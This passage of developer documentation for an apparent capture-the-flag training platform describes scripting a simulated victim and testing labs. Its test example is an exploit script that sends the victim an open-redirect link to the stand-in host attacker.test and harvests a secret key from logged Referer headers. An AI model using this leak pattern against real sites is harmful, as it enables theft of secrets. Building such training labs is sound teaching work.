  await sendPage(res, view('consent'), { message: out.body ?? '' });
});
```

### Scripting the victim

```ts
register(defineChallenge({
  /* id, district, slug, dir, title, summary, maps, levels, hints, mount */
  victim: {
    sim: (req) => labFor(req).world,
    actions: [
      { name: 'check-mail', label: VICTIM_LABELS.checkMail, run: (req) => {
          const s = labFor(req);
          const link = s.world.inbox.newest(ADMIN_MAILBOX)?.links[0];
          if (link === undefined) return 'The admin has no new mail.'; // an optional note for the panel (English)
          s.admin.follow(link);
      } },
      { name: 'send-link', label: VICTIM_LABELS.sendLink, input: 'url',
        run: (req, { url }) => { labFor(req).admin.follow(url); } },
    ],
  },
}));
```

The engine mounts `POST <lab>/victim/<name>?level=<level>` per action **before** the lab's own routes (the
`/victim/` prefix is reserved): it reads the `url` field (`input: 'url'`), runs `run` synchronously (a Promise is a
500), and answers 303 back to `<lab>?level=<level>`, so the forms work without JavaScript. Under every lab page
rendered with `sendPage` the layout adds the panel: the two hosts, one form per action (the link field keeps the last
link sent), "What the victim's browser did" (the note, and per visit its outcome and request count, **never its
URLs**: they can carry the very secret the lab is about), **the player's mailbox only**, and "Your server
(attacker.test) received…". Platform strings are bilingual; everything else is escaped. The only way a victim-side
secret may reach the player is the lab's flaw (the attacker log, or a stolen session): never echo the victim's pages
or the admin's mail anywhere else. Labels: `VICTIM_LABELS.checkMail` / `.sendLink`, or a lab `Text`.

Restart: a victim-driven lab whose state can get stuck may pass `reset: (req) => labs.reset(req)`; that drops the
world (inbox, attacker log, victim cookies) with the rest. The usual rule applies: no Restart on a lab with limiters.

### Testing

An exploit is a script, as the player would do it: craft the link → trigger the victim (`POST <lab>/victim/<name>`) →
read the attacker log on the lab page (`GET <lab>?level=<level>`) → complete the attack on the real lab → flag. Divine
resists with its usual answer. See SV-01 in `tests/sim-lab.spec.ts`:

```ts
const exploit: Script = async (agent, level) => {
  await agent.post(`${LAB}/victim/send-link?level=${level}`).type('form').send({ url: 'http://citadel.test/continue?next=http://attacker.test/x' });
  const page = await agent.get(`${LAB}?level=${level}&lang=en`);
  const key = referers(page.text).map((r) => new URL(r).searchParams.get('key')).find(Boolean) ?? 'none';
  return agent.post(`${LAB}?level=${level}`).type('form').send({ key });
};
```

Parse the panel's escaped HTML (`Referer: <code>...</code>`, `<code>GET http://attacker.test/...</code>`) and unescape
`&amp;` before using a URL. Test seams: `labFor({ sessionId: sid, level }).world` (`.visits` for the full trace,
`.attackerLog.entries()`, `.inbox.list(ADMIN_MAILBOX)`, `.now = () => t` for timestamps and expiry). `describeLabView`
works unchanged (it skips the panel's `sim-action` forms). Add the lab-specific cases: the victim's secret never
appears on the page except through the flaw, players and levels are isolated, the legit victim flow ends on a citadel
page, and links the lab builds from attacker input are shown escaped.
